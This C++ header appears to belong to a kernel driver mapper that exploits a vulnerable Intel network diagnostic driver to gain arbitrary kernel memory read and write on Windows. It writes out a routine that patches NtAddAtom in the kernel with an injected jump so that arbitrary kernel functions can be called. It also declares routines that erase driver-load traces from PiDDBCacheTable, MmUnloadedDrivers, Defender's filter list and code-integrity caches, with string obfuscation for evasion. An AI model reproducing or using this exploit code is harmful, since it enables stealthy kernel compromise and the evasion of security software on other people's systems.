#pragma once
#include <algorithm>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <cwctype>
#include <fstream>
#include <iostream>
#include <memory>
#include <random>
#include <string>
#include <type_traits>
#include <vector>
#include <windows.h>

#include <protection/sk_crypt.hxx>

#include <nt/nt.hxx>
#include <resource/resource.hxx>
#include <framework/util/util.hxx>
#include <intel/service/service.hxx>

typedef struct _COPY_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
} COPY_MEMORY_BUFFER_INFO, *PCOPY_MEMORY_BUFFER_INFO;

typedef struct _FILL_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint32_t value;
	uint32_t reserved2;
	uint64_t destination;
	uint64_t length;
} FILL_MEMORY_BUFFER_INFO, *PFILL_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_physical_address;
	uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO, *PGET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_value;
	uint64_t return_virtual_address;
	uint64_t physical_address_to_map;
	uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO, *PMAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint64_t reserved2;
	uint64_t virt_address;
	uint64_t reserved3;
	uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO, *PUNMAP_IO_SPACE_BUFFER_INFO;

namespace intel_driver
{
#ifndef INTEL_SKIP_NAL_IODELETE
#define INTEL_SKIP_NAL_IODELETE 1
#endif

	constexpr ULONG32 ioctl_code = 0x80862007;
	extern HANDLE h_device;
	extern ULONG64 ntoskrnl_address;
	extern std::string cached_driver_name;

	std::wstring get_driver_name_w( );
	std::wstring get_temp_path( );
	std::wstring get_driver_path( );
	bool is_running( );
	bool unload_stale_vulnerable_driver( );
	uint64_t get_kernel_module_address( const std::string& module_name );
	bool mem_copy( uint64_t destination, uint64_t source, uint64_t size );
	bool set_memory( uint64_t address, uint32_t value, uint64_t size );
	bool get_physical_address( uint64_t address, uint64_t* out_physical_address );
	uint64_t map_io_space( uint64_t physical_address, uint32_t size );
	bool unmap_io_space( uint64_t address, uint32_t size );
	bool read_memory( uint64_t address, void* buffer, uint64_t size );
	bool write_memory( uint64_t address, void* buffer, uint64_t size );
	bool write_to_readonly_memory( uint64_t address, void* buffer, uint32_t size );
	PVOID resolve_relative_address( _In_ PVOID instruction_pointer, _In_ ULONG offset, _In_ ULONG instruction_size );
	uint64_t get_kernel_module_export( uint64_t kernel_module_base, const std::string& function_name );

	template < typename T, typename... A >
	bool call_kfc( T* out_result, uint64_t kernel_function_address, const A... arguments )
	{
		constexpr auto call_void = std::is_same_v< T, void >;
		static_assert( sizeof...( A ) <= 4, "CallKernelFunction: Too many arguments, CallKernelFunction only can be called with 4 or less arguments" );

		if constexpr ( !call_void )
		{
			if ( !out_result )
				return false;
		}
		else
			UNREFERENCED_PARAMETER( out_result );

		if ( !kernel_function_address )
			return false;

		HMODULE ntdll = GetModuleHandleA( skCrypt( "ntdll.dll" ) );
		if ( ntdll == 0 )
			return false;

		const auto nt_add_atom = reinterpret_cast< void* >( GetProcAddress( ntdll, skCrypt( "NtAddAtom" ) ) );
		if ( !nt_add_atom )
			return false;

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[ sizeof( kernel_injected_jmp ) ];
		*( uint64_t* )&kernel_injected_jmp[ 2 ] = kernel_function_address;

		static uint64_t kernel_nt_add_atom = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "NtAddAtom" ) ) );
		if ( !kernel_nt_add_atom )
			return false;

		if ( !read_memory( kernel_nt_add_atom, &original_kernel_function, sizeof( kernel_injected_jmp ) ) )
			return false;

		if ( original_kernel_function[ 0 ] == kernel_injected_jmp[ 0 ] && original_kernel_function[ 1 ] == kernel_injected_jmp[ 1 ] &&
			 original_kernel_function[ sizeof( kernel_injected_jmp ) - 2 ] == kernel_injected_jmp[ sizeof( kernel_injected_jmp ) - 2 ] &&
			 original_kernel_function[ sizeof( kernel_injected_jmp ) - 1 ] == kernel_injected_jmp[ sizeof( kernel_injected_jmp ) - 1 ] )
			return false;

		if ( !write_to_readonly_memory( kernel_nt_add_atom, &kernel_injected_jmp, sizeof( kernel_injected_jmp ) ) )
			return false;

		if constexpr ( !call_void )
		{
			using epstein_kfc = T( __stdcall* )( A... );
			const auto function = reinterpret_cast< epstein_kfc >( nt_add_atom );
			*out_result = function( arguments... );
		}
		else
		{
			using epstein_kfc = void ( __stdcall* )( A... );
			const auto function = reinterpret_cast< epstein_kfc >( nt_add_atom );
			function( arguments... );
		};

		return write_to_readonly_memory( kernel_nt_add_atom, original_kernel_function, sizeof( kernel_injected_jmp ) );
	};

	bool ex_release_resource_lite( PVOID resource );
	bool ex_acquire_resource_exclusive_lite( PVOID resource, BOOLEAN wait );
	BOOLEAN rtl_delete_element_generic_table_avl( PVOID table, PVOID buffer );
	PVOID rtl_lookup_element_generic_table_avl( nt::PRTL_AVL_TABLE table, PVOID buffer );
	PVOID rtl_enumerate_generic_table_without_splaying_avl( nt::PRTL_AVL_TABLE table, PVOID* restart_key );
	BOOLEAN data_compare( const BYTE* data, const BYTE* mask, const char* mask_size );
	uintptr_t find_pattern( uintptr_t address, uintptr_t length, BYTE* mask, const char* mask_size );
	PVOID find_section( const char* section_name, uintptr_t module_pointer, PULONG size );
	uintptr_t find_pattern_kernel( uintptr_t address, uintptr_t length, BYTE* mask, const char* mask_size );
	uintptr_t find_section_kernel( const char* section_name, uintptr_t module_pointer, PULONG size );
	uintptr_t find_pattern_in_section_kernel( const char* section_name, uintptr_t module_pointer, BYTE* mask, const char* mask_size );
	uint64_t mm_allocate_independent_pages_ex( uint32_t size );
	bool mm_free_independent_pages( uint64_t address, uint32_t size );
	BOOLEAN mm_set_page_protection( uint64_t address, uint32_t size, ULONG new_protect );
	ULONG mapper_pool_tag( );
	uint64_t allocate_pool( nt::POOL_TYPE pool_type, uint64_t size );
	uint64_t allocate_pool_ex2( nt::POOL_TYPE pool_type, uint64_t size );
	bool free_pool( uint64_t address );
	bool clear_piddb_cache_table( );
	nt::PiDDBCacheEntry* piddb_lookup_entry( nt::PRTL_AVL_TABLE piddb_cache_table, ULONG timestamp, const wchar_t* name );
	bool clear_piddb_cache_table_lookup( );
	NTSTATUS accquire_debug_privilege( );
	bool clear_hash_bucket_list( );
	bool clear_mm_unloaded_drivers( );
	bool clear_wd_filter_driver_list( );
	bool clear_exp_cov_unloaded_drivers( );
	bool clear_ci_cache_lookaside_list( );
	void cache_trace_cleanup_context( );
	void perform_load_trace_cleanup( bool include_ci_hook = false );
	void perform_trace_cleanup( bool include_ci_hook );
	NTSTATUS unload( );
	NTSTATUS load( bool log_success = true );
};
